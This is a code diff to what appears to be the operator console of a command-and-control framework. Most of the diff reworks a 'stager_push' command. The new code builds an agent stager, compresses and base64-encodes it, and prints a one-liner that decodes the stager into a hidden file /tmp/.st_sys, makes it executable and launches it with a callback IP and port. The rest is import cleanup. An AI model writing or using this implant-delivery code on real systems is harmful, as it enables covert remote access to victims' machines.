@@ -1,11 +1,14 @@
-from core.plugins_engine import PluginsEngine
+import base64
+import os
+import select
 import socket
 import struct
-import os
-import tty
-import termios
+import subprocess
 import sys
-import select
+import termios
+import tty
+
+from core.plugins_engine import PluginsEngine
 
 HOST = "127.0.0.1"
 PORT = 9001
@@ -196,7 +199,7 @@ def handle_agent(conn, addr):
 
             if resp_len > 0:
                 result_raw = receive_exact(conn, resp_len)
-                print(f"Response:\n" + "-" * 30)
+                print("Response:\n" + "-" * 30)
                 print(result_raw.decode(errors="ignore").strip())
                 print("-" * 30)
 
@@ -225,15 +228,30 @@ def pre_shell():
                 print("Closing")
             finally:
                 server.close()
-        elif cmd.startswith("stager_push "):
+        elif cmd.startswith("stager_push"):
             try:
-                agent_bin_path = cmd.split(" ", 1)[1]
-                if not os.path.exists(agent_bin_path):
-                    print(f"ERROR: File {agent_bin_path} not found!")
+                parts = cmd.split()
+                if len(parts) < 3:
+                    print("Usage: stager_push [ip] [port]")
                     continue
+
+                s_ip, s_port = parts[1], parts[2]
+
+                agent_bin_path = "../build/stager"
+                if not os.path.exists(agent_bin_path):
+                    subprocess.run(["make", "stager"], cwd="..", check=False)
 
                 with open(agent_bin_path, "rb") as f:
                     agent_bytes = f.read()
+
+                import gzip
+
+                compressed_data = gzip.compress(agent_bytes, compresslevel=9)
+
+                b64 = base64.b64encode(compressed_data).decode("utf-8")
+                print(
+                    f"pusher>\necho {b64} | base64 -d | gunzip > /tmp/.st_sys && chmod +x /tmp/.st_sys && /tmp/.st_sys {s_ip} {s_port}"
+                )
 
                 stager_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 stager_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
